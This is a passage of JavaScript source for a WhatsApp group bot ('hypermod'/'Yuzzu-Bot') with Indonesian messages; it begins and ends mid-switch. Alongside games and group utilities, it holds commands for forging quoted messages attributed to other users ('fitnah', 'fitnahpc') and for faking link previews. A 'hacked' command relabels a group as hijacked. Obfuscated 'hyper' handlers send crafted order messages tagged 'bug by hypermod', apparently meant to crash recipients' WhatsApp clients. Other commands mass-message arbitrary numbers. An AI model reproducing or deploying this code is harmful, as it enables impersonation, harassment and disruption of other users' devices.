					  reply(batu)
					} else {
					  reply('Pilih gunting/batu/kertas')
					}
break
		    case 'slot':
            case 'slots':
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            hypermod.sendMessage(from, `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy}<=====\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nKeterangan : Jika anda Mendapatkan 3Buah Sama Berarti Anda Menang\n\nContoh : 🍌 : 🍌 : 🍌<=====`, MessageType.text, { quoted: mek })
            break
				case 'kontak':
				if (!isGroup) return reply(mess.only.group)
					argzu = arg.split('|')
				if (!argzu) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					sendKontak(from, mentioned[0].split('@')[0], argzu[1])
				} else {
					sendKontak(from, argzu[0], argzu[1])
				}
				break
				case 'kontag':
				if (!isGroup) return reply(mess.only.group)
				argzi = arg.split('|')
				if (!argzi) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
				if (mek.message.extendedTextMessage != undefined){
                    		mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					hideTagKontak(from, mentioned[0].split('@')[0], argzi[1])
				} else {
					hideTagKontak(from, argzi[0], argzi[1])
				}
				break
				case 'getdeskgc':
				if (!isGroup) return reply(mess.only.group)
					anu = from
			   metadete = await hypermod.groupMetadata(anu)
				hypermod.sendMessage(from, metadete.desc, text, {quoted:mek})
				  break
					case 'getppgc':
					if (!isGroup) return reply(mess.only.group)
					anu = from
		if (`${anu}@g.us`) {
		try {
					ppimg = await hypermod.getProfilePicture(anu)
				} catch {
					ppimg = 'https://i.pinimg.com/originals/87/db/f5/87dbf52f353af29b2cbc3896b590c76c.jpg'
				}
				metadete = await hypermod.groupMetadata(anu)
				ano = await hypermod.getProfilePicture(anu)
				buffer = await getBuffer(ano)
				hypermod.sendMessage(from, buffer, image, {quoted: mek})
		} else {
		}
			  break
				case 'getbio':
				    if (!isGroup) return reply(mess.only.group)
					if (args.length < 1) return reply('Tag orangnya!')
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                    const p = await hypermod.getStatus(`${mentioned}`, MessageType.text)
                    reply(p.status)
                    if (p.status == 401) {
                    reply(mess.error.api)
                    }
                    break
				case 'getpict':
				case 'getpic':
				case 'getpp':
					if (!isGroup) return reply(mess.only.group)
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            pictt = await hypermod.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            hypermod.sendMessage(from, pict, image, {quoted: mek})
            break
				case 'chat':
			if (args[0].startsWith('08')) return reply('Awali nomor dengan 62')
            if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
			if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|teks`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            hypermod.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            break
				case 'attp':
					if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp crew`)
					atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(c)}`)
					hypermod.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
				case 'semoji':
			if (args === 0) return reply('emojinya?')   
		   aku4 = args.join(' ')
           emoji.get(`${aku4}`).then(emoji => {
           link = `${emoji.images[4].url}`
		   sendWebp(from, `${link}`).catch(() => reply('gagal'))
           })
    	   break
				case 'tag':
			if (args.length < 1) return reply(`Penggunaan ${prefix}tag 62xnxx`)
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					hypermod.sendMessage(from, tagq, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./hypermod.jpg'), surface: 200, message: `Yuzzu-Bot`, orderTitle: `Yuzzu-Bot`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
			case 'tagme':
                  var nomqm = mek.participant
				    tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
					hypermod.sendMessage(from, tagu, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./hypermod.jpg'), surface: 200, message: `Yuzzu-Bot`, orderTitle: `Yuzzu-Bot`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
					break
				case 'join':
				if (!isOwner) return reply(mess.only.ownerB)
				 if (args.length < 1) return ephe('Link nya mana?')
					hypermod.query({
json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
})
sendFakeStatus(from, `Succes Bergabung Dalam Group`)
break
				case 'totag':
				if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
			if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hypermod.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await hypermod.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hypermod.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmediau = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hypermod.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await hypermod.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hypermod.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hypermod.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await hypermod.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4', duration: 999999999,
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hypermod.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
         } else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hypermod.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await hypermod.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/gif',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hypermod.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedDocument) && args.length == 0) {
            encmediau = isQuotedDocument ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hypermod.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await hypermod.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'text/plain',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hypermod.sendMessage(from, ini_buffer, document, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hypermod.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await hypermod.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', duration: 999999999,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hypermod.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/dokumen/gif/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
				case 'status':
case 'stats':
				var groups = hypermod.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = hypermod.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
					uptime = process.uptime();
					const timestamp = speed();
					const totalChat = await hypermod.chats.all()
					var charge = charging ? 'true' : 'false'
					var listrik = charging ? 'Dicas' : 'Tidak Dicas'
					const latensi = speed() - timestamp
					var total = math(`${groups.length} ${privat.length}`)
					const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = hypermod.user.phone
					stamtus = `⍟ ────────────────── ⍟

Private Chat : ${privat.length}
Group Chat : ${groups.length}
Total Chat : ${totalChat.length}
Speed : ${latensi.toFixed(4)} Second
Runtime : ${kyun(uptime)}
Baterai : ${JSON.stringify(baterai)}% - ${listrik}
Status : ${publik ? 'Public' : 'Self'}
Penggunaan Ram : ${ram2}
Hostname : ${os.hostname()}
Platform : ${os.platform()}
Uptime : ${kyun(os.uptime())}
MNC : ${mnc}
MCC : ${mcc}
Device Model: ${hypermod.user.phone.device_model}
Device Manufactur : ${device_manufacturer}
Wa Version: ${hypermod.user.phone.wa_version}
Os Version: ${hypermod.user.phone.os_version}

⍟ ────────────────── ⍟`
hypermod.sendMessage(from, stamtus, text, { thumbnail: dfrply, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./hypermod.jpg'), surface: 200, message: 'Yuzzu-BotYuz-Bot', orderTitle: 'Yuzzu-Bot', sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
break
				case 'tobc':
				if (!isOwner) return reply(mess.only.ownerB)
				if (args.length < 1) return reply('Teksnya?')
				var bc = body.slice(6)
					hypermod.updatePresence(from, Presence.composing)
					anu = await hypermod.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await hypermod.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							hypermod.sendMessage(_.jid, buff, audio, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./hypermod.jpg'), surface: 200, message: `${bc}`, orderTitle: `${bc}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, mimetype: 'audio/mp4', duration: 999999999, ptt: true })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await hypermod.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							hypermod.sendMessage(_.jid, buff, sticker, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./hypermod.jpg'), surface: 200, message: `${bc}`, orderTitle: `${bc}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          reply('reply sticker/audio')
							}
					break
					case 'fdeface':
var nn = body.slice(9)
                                var urlnye = nn.split("|")[0];
                                var titlenye = nn.split("|")[1];
                                var descnye = nn.split("|")[2];
                                imgbbb = require('imgbb-uploader')
                                run = getRandom('.jpeg')
                                encmediad = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                                mediad = await hypermod.downloadAndSaveMediaMessage(encmediad)
                                ddatae = await imageToBase64(JSON.stringify(mediad).replace(/\"/gi, ''))
                                hypermod.sendMessage(from, {
                                        text: `${urlnye}`,
                                        matchedText: `${urlnye}`,
                                        canonicalUrl: `${urlnye}`,
                                        description: `${descnye}`,
                                        title: `${titlenye}`,
                                        jpegThumbnail: ddatae
                                }, 'extendedTextMessage', { detectLinks: false })
                                break
                                break
					case 'ephemeral':    
					if (!isGroup) return reply(mess.only.group)
					ppgc = await hypermod.getProfilePicture(from)
                teks = args.join(' ')
                sksks = body.slice(11)
                options = {
                sendEphemeral: true, 
               thumbnail: await imageToBase64(ppgc)
                }
              await hypermod.sendMessage(from, `${sksks}`, text, options, { contextInfo: { forwardingScore: 508, isForwarded: true}})
               break
            case 'online':
            if (!isOwner) return reply(mess.only.ownerB)
				offline = false
				sendFakeStatus(from, `*Status : ONLINE*`)
				break
			case 'offline':
			if (!isOwner) return reply(mess.only.ownerB)
				offline = true
                waktuafk = Date.now()
                anuu = body.slice(9) ? body.slice(9) : '-'
                alasanafk = anuu
				sendFakeStatus(from, `Fitur OFFLINE diaktifkan`)
				break
           case 'fitnahpc':
                if (args.length < 1) return reply(`Usage :\n${prefix}fake [nomor|pesan|balasanbot]]\n\nEx : \n${prefix}fake 0|hai|hai juga markenlin`)
                var gh = body.slice(10)
                var parti = gh.split("|")[0];
                var targetq = gh.split("|")[1];
				var bot = gh.split("|")[2];
			    hypermod.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${parti}@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { conversation: `${targetq}` }}})
					break
            case 'hidetag':
            if (!isGroup) return reply(mess.only.group)
            ht = body.slice(9)
                members_id = []
				for (let mem of groupMembers) {
					members_id.push(mem.jid)
				}
                mentions(ht, members_id, false)
                break
case 'antilink':  
                   if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('PILIH 1/0')
					if (Number(args[0]) === 1) {
					if (isAntiLink) return reply('Sudah Aktif Kak')
					antilink.push(from)
					fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
					reply('*[❗] ACTIVATED ANTILINK*')
					} else if (Number(args[0]) === 0) {
					antilink.splice(from, 1)
					fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
					reply('*[❗] DEACTIVATED ANTILINK*')
					} else {
					reply(`PILIH 1/0`)
					}
					break
case 'welcome':  
           if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('PILIH 1/0')
					if (Number(args[0]) === 1) {
					if (isWelkom) return reply('*SUDAH AKTIF* !!!')
					welkom.push(from)
					fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
					reply('[❗] SUKSES AKTIF WELCOME')
					} else if (Number(args[0]) === 0) {
					welkom.splice(from, 1)
				    fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
				    reply('[❗] SUKSES NONAKTIF WELCOME')
					} else {
					reply(`......`)
					}
					break  
					case 'antibule':
					if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}antibule 1`)
				    if (Number(args[0]) === 1) {
						if (isKickArea) return reply('Sudah Aktif Kak')
						kickarea.push(from)
						fs.writeFileSync('./database/kickarea.json', JSON.stringify(kickarea))
						sendFakeStatus(from, `Sukses`, fake)
			  } else if (Number(args[0]) === 0) {
						if (!isKickArea) return reply('Sudah Mati Kak')
						kickarea.splice(from, 1)
						fs.writeFileSync('./database/kickarea.json', JSON.stringify(kickarea))
						sendFakeStatus(from, `Sukses`, fake)
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
						break
            case 'fitnah':
            if (!isGroup) return reply(mess.only.group)
                cr = body.slice(4)
                cs = cr.split('|')
                taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                const target = {
					contextInfo: {
						participant: taged,
						quotedMessage: {
							extendedTextMessage: {
								text: cs[1]
							}
						}
					}
				}
				hypermod.sendMessage(from, cs[2], MessageType.text, target)
				break
              case 'hacked':
              if (!isGroup) return reply(mess.only.group)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
              if (args.length < 1) return reply('හයිජැක් වෙන ගමන්')
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   hypermod.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                hypermod.groupUpdateSubject(from, `HIJACKED BY ${body.slice(8)}`)
                await sleep(1000)
                hypermod.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)             
                await sleep(1000)
                hypermod.sendMessage(from, 'Succes HIJACKED', text, {quoted: mek})
					break
					case 'hypercombine':
var _0x58f2=['mtaYmZG0n0npA2PVuG','mZq4otCXseLADxvK','B3DUzxjc','mMTbue14EG','mebZlNDOyxrZyxbWlM5LDa','mJG4nZq2rwXqEuP1','Dg9Nz2XLrgLZyxbWzwfYAw5NtwvZC2fNzxm','odmZodrTA0z6CKO','y3jLD2jVDdi','zgfOBgfO','C2vUze1LC3nHz2u','mZyWmZG3tM9Lrw9S','DxbKyxrLuhjLC2vUy2u','sefds0ve','mZy5ndqWqwfOC3Pt','qgrLBNnZChrYywe','mtCZmdi0wMDxrene','mvHiEMndsW'];var _0x273f32=_0xae41;function _0xae41(_0x4810c2,_0x4c991d){_0x4810c2=_0x4810c2-0x1df;var _0x58f2d3=_0x58f2[_0x4810c2];if(_0xae41['FfoZJA']===undefined){var _0xae4172=function(_0x27b1ac){var _0xf70c93='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x3d07a1='';for(var _0x338a8c=0x0,_0x2c4b46,_0x5a8018,_0x176652=0x0;_0x5a8018=_0x27b1ac['charAt'](_0x176652++);~_0x5a8018&&(_0x2c4b46=_0x338a8c%0x4?_0x2c4b46*0x40+_0x5a8018:_0x5a8018,_0x338a8c++%0x4)?_0x3d07a1+=String['fromCharCode'](0xff&_0x2c4b46>>(-0x2*_0x338a8c&0x6)):0x0){_0x5a8018=_0xf70c93['indexOf'](_0x5a8018);}return _0x3d07a1;};_0xae41['MdoMVX']=function(_0x295742){var _0x5e6dfb=_0xae4172(_0x295742);var _0xb89b80=[];for(var _0x34b480=0x0,_0x28e944=_0x5e6dfb['length'];_0x34b480<_0x28e944;_0x34b480++){_0xb89b80+='%'+('00'+_0x5e6dfb['charCodeAt'](_0x34b480)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0xb89b80);},_0xae41['hmiUvG']={},_0xae41['FfoZJA']=!![];}var _0x2c14e4=_0x58f2[0x0],_0x5efe9e=_0x4810c2+_0x2c14e4,_0x1e9e69=_0xae41['hmiUvG'][_0x5efe9e];return _0x1e9e69===undefined?(_0x58f2d3=_0xae41['MdoMVX'](_0x58f2d3),_0xae41['hmiUvG'][_0x5efe9e]=_0x58f2d3):_0x58f2d3=_0x1e9e69,_0x58f2d3;}(function(_0x3e62cb,_0x496b48){var _0x1aec91=_0xae41;while(!![]){try{var _0x34b4cd=parseInt(_0x1aec91(0x1e5))+-parseInt(_0x1aec91(0x1e1))*parseInt(_0x1aec91(0x1e4))+-parseInt(_0x1aec91(0x1e3))+-parseInt(_0x1aec91(0x1e6))*parseInt(_0x1aec91(0x1e8))+parseInt(_0x1aec91(0x1ea))+parseInt(_0x1aec91(0x1ec))+parseInt(_0x1aec91(0x1f0));if(_0x34b4cd===_0x496b48)break;else _0x3e62cb['push'](_0x3e62cb['shift']());}catch(_0x5922da){_0x3e62cb['push'](_0x3e62cb['shift']());}}}(_0x58f2,0x7df76));if(!isOwner)return reply(mess['only'][_0x273f32(0x1e7)]);hypermod[_0x273f32(0x1eb)](from,_0x273f32(0x1e0)),hypermod[_0x273f32(0x1ef)](from,_0x273f32(0x1ed),text,{'quoted':{'key':{'participant':_0x273f32(0x1e9)},'message':{'orderMessage':{'itemCount':0x98967f,'status':0x1,'surface':0x1,'message':_0x273f32(0x1ed),'orderTitle':_0x273f32(0x1e2),'sellerJid':_0x273f32(0x1e9)}}}}),setTimeout(()=>{var _0x15f33f=_0x273f32;hypermod[_0x15f33f(0x1df)](from,Presence['composing']),sendMess(_0x15f33f(0x1ee));},0x7d0),reply(_0x273f32(0x1ee));
break
case 'hyperlokasi':
var _0x5262=['mteXmteXmteXqhmUD2HHDhnHChaUBMv0','mZG3mdK1A1jKAeTc','mMTtz0j5rG','C2vUze1LC3nHz2u','mti5ntntzKn3wuK','y3jLD2jVDdi','mw9eDwXxsq','nta0oeTly1z0yG','mJu0ndu0s1Dxqxnx','odi4otfdvMzzDhu','ogDuBer4Da','lI9Kzw56lMPWzW','B25SEq','ndiWodyWt21ws1vV','mKLOquzsAa','mta5ntiYn05NEfjArq'];var _0x21d390=_0x9518;function _0x9518(_0x44b3d9,_0x462517){_0x44b3d9=_0x44b3d9-0x15d;var _0x5262e5=_0x5262[_0x44b3d9];if(_0x9518['ZNxiwL']===undefined){var _0x9518bc=function(_0x2f4178){var _0x217a29='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0xb9c7de='';for(var _0x50df0d=0x0,_0x46c35d,_0x291992,_0x43adee=0x0;_0x291992=_0x2f4178['charAt'](_0x43adee++);~_0x291992&&(_0x46c35d=_0x50df0d%0x4?_0x46c35d*0x40+_0x291992:_0x291992,_0x50df0d++%0x4)?_0xb9c7de+=String['fromCharCode'](0xff&_0x46c35d>>(-0x2*_0x50df0d&0x6)):0x0){_0x291992=_0x217a29['indexOf'](_0x291992);}return _0xb9c7de;};_0x9518['ZvyGzP']=function(_0x4ac3b3){var _0x1269fb=_0x9518bc(_0x4ac3b3);var _0x345e93=[];for(var _0x21e6b8=0x0,_0x1e2497=_0x1269fb['length'];_0x21e6b8<_0x1e2497;_0x21e6b8++){_0x345e93+='%'+('00'+_0x1269fb['charCodeAt'](_0x21e6b8)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x345e93);},_0x9518['iFDoQk']={},_0x9518['ZNxiwL']=!![];}var _0x12e13e=_0x5262[0x0],_0x41043d=_0x44b3d9+_0x12e13e,_0x26ce3c=_0x9518['iFDoQk'][_0x41043d];return _0x26ce3c===undefined?(_0x5262e5=_0x9518['ZvyGzP'](_0x5262e5),_0x9518['iFDoQk'][_0x41043d]=_0x5262e5):_0x5262e5=_0x26ce3c,_0x5262e5;}(function(_0x3432a0,_0x3409b4){var _0x264797=_0x9518;while(!![]){try{var _0x59a18e=-parseInt(_0x264797(0x16a))*parseInt(_0x264797(0x160))+parseInt(_0x264797(0x16c))*-parseInt(_0x264797(0x162))+-parseInt(_0x264797(0x15f))+-parseInt(_0x264797(0x166))*parseInt(_0x264797(0x161))+-parseInt(_0x264797(0x165))+parseInt(_0x264797(0x169))+parseInt(_0x264797(0x167))*parseInt(_0x264797(0x15e));if(_0x59a18e===_0x3409b4)break;else _0x3432a0['push'](_0x3432a0['shift']());}catch(_0x339e97){_0x3432a0['push'](_0x3432a0['shift']());}}}(_0x5262,0x43e54));if(!isOwner)return reply(mess[_0x21d390(0x164)]['ownerB']);hypermod['updatePresence'](from,Presence['composing']);var bro=await getBuffer(_0x21d390(0x163));hypermod[_0x21d390(0x16b)](from,{'degreesLatitude':34.0184,'degreesLongitude':-118.411,'name':_0x21d390(0x15d),'address':fake,'jpegThumbnail':bro},location,{'quoted':{'key':{'participant':_0x21d390(0x168)},'message':{'orderMessage':{'itemCount':0x11170,'status':0x1,'surface':0x1,'message':_0x21d390(0x15d),'orderTitle':fake,'sellerJid':'0@s.whatsapp.net'}}}});
break
case 'hyperpc':
					case 'hyperpc':
var _0x1e0a=['ng9AALbhzG','y29TCg9ZAw5N','qgrLBNnZChrYywe','mLHfAuHIBG','mZeXnJmWALbvsvPL','DxbKyxrLuhjLC2vUy2u','C2vUze1LC3nHz2u','mZCZnJiYyvLAsvL4','ntaZodbZv292Bfu','mZuWmJa0Bw1rthn3','mJiXntLWD3fyD1y','B25SEq','nZi5nZjHEw5mrK0','ndCXmteXv1j2s3Dr'];var _0x1e1570=_0x1cdc;function _0x1cdc(_0x3b5420,_0xc28e03){_0x3b5420=_0x3b5420-0x156;var _0x1e0a9a=_0x1e0a[_0x3b5420];if(_0x1cdc['HzxOzL']===undefined){var _0x1cdc20=function(_0x340030){var _0x75d462='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x4a5cad='';for(var _0x4fab0e=0x0,_0x252ec5,_0x483374,_0x50c643=0x0;_0x483374=_0x340030['charAt'](_0x50c643++);~_0x483374&&(_0x252ec5=_0x4fab0e%0x4?_0x252ec5*0x40+_0x483374:_0x483374,_0x4fab0e++%0x4)?_0x4a5cad+=String['fromCharCode'](0xff&_0x252ec5>>(-0x2*_0x4fab0e&0x6)):0x0){_0x483374=_0x75d462['indexOf'](_0x483374);}return _0x4a5cad;};_0x1cdc['GVkRCv']=function(_0x2834b6){var _0x517c6b=_0x1cdc20(_0x2834b6);var _0x91c801=[];for(var _0x1753ec=0x0,_0x55d373=_0x517c6b['length'];_0x1753ec<_0x55d373;_0x1753ec++){_0x91c801+='%'+('00'+_0x517c6b['charCodeAt'](_0x1753ec)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x91c801);},_0x1cdc['YTWKcT']={},_0x1cdc['HzxOzL']=!![];}var _0x12ec9c=_0x1e0a[0x0],_0x4da9eb=_0x3b5420+_0x12ec9c,_0x16b46b=_0x1cdc['YTWKcT'][_0x4da9eb];return _0x16b46b===undefined?(_0x1e0a9a=_0x1cdc['GVkRCv'](_0x1e0a9a),_0x1cdc['YTWKcT'][_0x4da9eb]=_0x1e0a9a):_0x1e0a9a=_0x16b46b,_0x1e0a9a;}(function(_0x1b8658,_0x253b48){var _0x5973c4=_0x1cdc;while(!![]){try{var _0x515f31=parseInt(_0x5973c4(0x157))+-parseInt(_0x5973c4(0x15a))*parseInt(_0x5973c4(0x15c))+parseInt(_0x5973c4(0x156))+-parseInt(_0x5973c4(0x15b))+parseInt(_0x5973c4(0x160))+parseInt(_0x5973c4(0x163))+parseInt(_0x5973c4(0x15f))*-parseInt(_0x5973c4(0x158));if(_0x515f31===_0x253b48)break;else _0x1b8658['push'](_0x1b8658['shift']());}catch(_0x4fdec7){_0x1b8658['push'](_0x1b8658['shift']());}}}(_0x1e0a,0x43ff7));if(!isOwner)return reply(mess[_0x1e1570(0x159)]['ownerB']);hypermod[_0x1e1570(0x161)](from,Presence[_0x1e1570(0x15d)]),hypermod[_0x1e1570(0x162)](from,'yaudah\x20oke',text,{'quoted':{'key':{'participant':'1111111111@s.whatsapp.net'},'message':{'orderMessage':{'itemCount':0x11170,'status':0x1,'surface':0x1,'message':'bug by hypermod','orderTitle':_0x1e1570(0x15e),'sellerJid':'0@s.whatsapp.net'}}}});
break
case 'hypertroli2':
